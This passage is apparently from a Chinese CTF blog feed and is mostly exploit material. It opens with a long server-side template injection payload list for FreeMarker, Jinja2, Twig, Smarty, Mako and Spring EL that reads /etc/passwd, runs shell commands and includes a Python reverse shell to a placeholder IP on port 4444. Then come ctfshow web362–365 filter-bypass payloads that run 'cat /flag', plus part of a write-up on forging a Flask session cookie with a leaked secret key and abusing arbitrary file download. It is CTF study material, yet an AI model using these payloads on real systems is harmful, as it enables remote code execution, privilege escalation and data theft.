&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123; ex(&quot;id&quot;)&#125;</span><br><span class="line">[#assign ex = &#x27;freemarker.template.utility.Execute&#x27;?new()]$&#123; ex(&#x27;id&#x27;)&#125;</span><br><span class="line">$&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;id&quot;)&#125;</span><br><span class="line">&#123;&#123;app.request.query.filter(0,0,1024,&#123;&#x27;options&#x27;:&#x27;system&#x27;&#125;)&#125;&#125;</span><br><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](&quot;/etc/passwd&quot;).read() &#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.mro()[1].__subclasses__()[396](&#x27;cat flag.txt&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;&#123;&#123;x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(request.args.input).read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br><span class="line">&#123;$smarty.version&#125;</span><br><span class="line">&#123;php&#125;echo `id`;&#123;/php&#125;</span><br><span class="line">&#123;&#123;[&#x27;id&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&#x27;cat\x20/etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&#x27;cat$IFS/etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr([&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr([&quot;__&quot;,&quot;class&quot;,&quot;__&quot;]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr(&quot;__class__&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;request.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr(&#x27;application&#x27;)|attr(&#x27;\x5f\x5fglobals\x5f\x5f&#x27;)|attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;\x5f\x5fbuiltins\x5f\x5f&#x27;)|attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;\x5f\x5fimport\x5f\x5f&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;id&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;new java.lang.String(&#x27;xxx&#x27;)\&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;whoami\\\&quot;); x.start()\&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;netstat\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;uname\\\&quot;,\\\&quot;-a\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)&#125;&#125;</span><br><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;&#123;&#123;x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&quot;python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;ip\&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/cat\&quot;, \&quot;flag.txt\&quot;]);&#x27;&quot;).read().zfill(417)&#125;&#125;&#123;%endif%&#125;&#123;% endfor %&#125;</span><br><span class="line">$&#123;T(java.lang.System).getenv()&#125;</span><br><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;cat etc/passwd&#x27;)&#125;</span><br><span class="line">$&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())&#125;$&#123;self.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.__init__.__globals__[&#x27;util&#x27;].os.system(&#x27;id&#x27;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.__init__.__globals__[&#x27;os&#x27;].system(&#x27;id&#x27;)&#125;</span><br><span class="line">$&#123;self.module.cache.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template._mmarker.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.cache.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template._mmarker.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.filters.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.exceptions.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.cache.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.cache.util.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.util.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.exceptions.traceback.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.exceptions.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template._mmarker.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.cache.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.template.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template._mmarker.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template._mmarker.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template._mmarker.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.filters.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.template.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template._mmarker.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.exceptions.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.exceptions.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template._mmarker.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.exceptions.traceback.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">&#123;&#123;self._TemplateReference__context.cycler.__init__.__globals__.os&#125;&#125;</span><br><span class="line">&#123;&#123;self._TemplateReference__context.joiner.__init__.__globals__.os&#125;&#125;</span><br><span class="line">&#123;&#123;self._TemplateReference__context.namespace.__init__.__globals__.os&#125;&#125;</span><br><span class="line">&#123;&#123;cycler.__init__.__globals__.os&#125;&#125;</span><br><span class="line">&#123;&#123;joiner.__init__.__globals__.os&#125;&#125;</span><br><span class="line">&#123;&#123;namespace.__init__.__globals__.os&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;</span><br><span class="line">&quot;&quot;</span><br><span class="line">.</span><br><span class="line">_</span><br><span class="line">__</span><br><span class="line">[</span><br><span class="line">]</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#x27;</span><br><span class="line">&#x27;&#x27;</span><br><span class="line">class</span><br><span class="line">base</span><br><span class="line">bases</span><br><span class="line">subclasses</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">()</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230409222145988.png" alt="image-20230409222145988"></p><p>似乎过滤了2和3</p><p>绕过数字，随便用一个字母就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;c.__init__&#125;&#125;</span><br><span class="line">?name=&#123;&#123;bohemian.__init__.__globals__&#125;&#125;</span><br><span class="line">?name=&#123;&#123;bohemian.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]&#125;&#125;</span><br><span class="line">有<span class="built_in">eval</span>了</span><br><span class="line">?name=&#123;&#123;bohemian.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230409222556134.png" alt="image-20230409222556134"></p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230409222730355.png" alt="image-20230409222730355"></p><h4 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h4><p>fuzz一下，过滤了单双引号,可以使用圆括号及args get 或post 或 cookie参数</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230409223204317.png" alt="image-20230409223204317"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">request.args.b</span><br><span class="line">request.values.b</span><br><span class="line">request.cookies.b</span><br><span class="line"></span><br><span class="line">源</span><br><span class="line">http://76d85bcd-ec44-4686-965c-bddb2b8af3fd.challenge.ctf.show/?name=&#123;&#123;bohemian.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">//将带引号的popen和ls换掉即可</span><br><span class="line">payload</span><br><span class="line">http://76d85bcd-ec44-4686-965c-bddb2b8af3fd.challenge.ctf.show/?name=&#123;&#123;bohemian.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2</span><br><span class="line">http://76d85bcd-ec44-4686-965c-bddb2b8af3fd.challenge.ctf.show/?name=&#123;&#123;bohemian.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.values.a](request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br></pre></td></tr></table></figure><h4 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h4><p>好像和363一样过滤了单双引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://be1c7d5b-82ba-4405-a533-0fc2b28c9dff.challenge.ctf.show/?name=&#123;&#123;bohemian.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.values.a](request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br></pre></td></tr></table></figure><h4 id="365"><a href="#365" class="headerlink" title="365"></a>365</h4><p>过滤了[]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://82ab42e3-eae4-4c5b-80f5-83fae500e217.challenge.ctf.show/?name=&#123;&#123;url_for.__globals__.os.popen(request.values.c).read()&#125;&#125;&amp;c=id</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow-第三届愚人杯web-wp</title>
      <link href="/2023/04/06/CTFshow-%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%84%9A%E4%BA%BA%E6%9D%AFweb-wp/"/>
      <url>/2023/04/06/CTFshow-%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%84%9A%E4%BA%BA%E6%9D%AFweb-wp/</url>
      
        <content type="html"><![CDATA[<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h4><p><a href="https://ctf.show/challenges#easy_signin-3967">https://ctf.show/challenges#easy_signin-3967</a></p><p>首先给到一个url</p><p><a href="http://f43e5622-a292-404c-98b5-85b54f0450d8.challenge.ctf.show/?img=ZmFjZS5wbmc=">http://f43e5622-a292-404c-98b5-85b54f0450d8.challenge.ctf.show/?img=ZmFjZS5wbmc=</a></p><p>url后img为base64  ZmFjZS5wbmc=   =&gt; face.png</p><p>那可以直接读取源码，index.php,    index.php  =&gt; aW5kZXgucGhw</p><p>右键查看源代码即可看到</p><img src='data:image/png;base64,PD9waHAKLyoKIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KIyBAQXV0aG9yOiBoMXhhCiMgQERhdGU6ICAgMjAyMy0wMy0yNyAxMDozMDozMAojIEBMYXN0IE1vZGlmaWVkIGJ5OiAgIGgxeGEKIyBATGFzdCBNb2RpZmllZCB0aW1lOiAyMDIzLTAzLTI4IDEyOjE1OjMzCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQojIEBsaW5rOiBodHRwczovL2N0ZmVyLmNvbQoKKi8KCiRpbWFnZT0kX0dFVFsnaW1nJ107CgokZmxhZyA9ICJjdGZzaG93ezRjNzJiODAwLTMzNjQtNGQ1NC05YWU0LTIwYTE4YzYxYTMxZn0iOwppZihpc3NldCgkaW1hZ2UpKXsKCSRpbWFnZSA9IGJhc2U2NF9kZWNvZGUoJGltYWdlKTsKCSRkYXRhID0gYmFzZTY0X2VuY29kZShmaWxlX2dldF9jb250ZW50cygkaW1hZ2UpKTsKCWVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL3BuZztiYXNlNjQsJGRhdGEnLz4iOwp9ZWxzZXsKCSRpbWFnZSA9IGJhc2U2NF9lbmNvZGUoImZhY2UucG5nIik7CgloZWFkZXIoImxvY2F0aW9uOi8/aW1nPSIuJGltYWdlKTsKfQoKCgoK'/><p>pd9开头为&lt;?php 直接解密即可</p><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406144147722.png" alt="image-20230406144147722"></p><h4 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h4><p><a href="https://ctf.show/challenges#easy_flask-3971">https://ctf.show/challenges#easy_flask-3971</a></p><p>打开题目连接是一个登录框，可以进行用户注册</p><p>可以参考这篇文章</p><p><code>https://blog.csdn.net/since_2020/article/details/119543172</code></p><p>随便一个用户注册，123/123登录上去，可以看到learn可以点击，查看到源代码</p><p>有一个<code>app.secret_key = &#39;S3cr3tK3y&#39;</code>最为显眼，联想到flask session伪造，</p><p>可以重新登录抓包，看是否有session</p><p>Cookie: session=eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6IjEyMyJ9.ZC52mw.SomJhBqFTfEKGMkcqlorSxEhAHA</p><p>可以看到session jwt相似用<code>https://github.com/noraj/flask-session-cookie-manager</code>这个工具可以进行解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># python3 flask_session_cookie_manager3.py decode -c &quot;eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6IjEyMyJ9.ZC52mw.SomJhBqFTfEKGMkcqlorSxEhAHA&quot; -s &quot;S3cr3tK3y&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;loggedin&#x27;</span>: True, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>可以看到有role值为user，源码中未见管理员的字样，盲猜为admin，接着构造包</p><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406161237019.png" alt="image-20230406161237019"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># python3 flask_session_cookie_manager3.py encode -s &quot;S3cr3tK3y&quot; -t &quot;&#123;&#x27;loggedin&#x27;: True, &#x27;role&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;123&#x27;&#125;&quot;</span></span><br><span class="line">eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiIxMjMifQ.ZC5-7A.6id7rF3wmWSp5nux_ylHGAhfbn8</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将构造好的数据进行替换session，这样</p><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406161503735.png" alt="image-20230406161503735"></p><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406161453957.png" alt="image-20230406161453957"></p><p>再次访问主页面，即可看到主页面多了一个下载的地方，</p><p><a href="http://1ca40a3d-c1de-44e7-bd25-dda1d37a3031.challenge.ctf.show/download/?filename=fakeflag.txt%EF%BC%8C%E7%82%B9%E5%87%BB%E6%97%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%8C%E6%8E%A5%E4%B8%8B%E6%9D%A5%E5%B0%B1%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%EF%BC%8C%E5%9C%A8%E6%9C%80%E5%BC%80%E5%A7%8B%E7%9C%8B%E5%88%B0show%E7%9B%AE%E5%BD%95%E6%97%B6%EF%BC%8C%E5%B7%A6%E4%B8%8A%E8%A7%92%E6%9C%89%E4%B8%80%E4%B8%AAapp.py%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%90%8E%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%BA%90%E7%A0%81">http://1ca40a3d-c1de-44e7-bd25-dda1d37a3031.challenge.ctf.show/download/?filename=fakeflag.txt，点击时任意文件下载，接下来就下载源码，在最开始看到show目录时，左上角有一个app.py直接下载，下载后可以看到源码</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: &#123;<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;LKHSADSFHLA;KHLK;FSDHLK;ASFD&#x27;</span>, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="comment"># Check if user is loggedin</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span 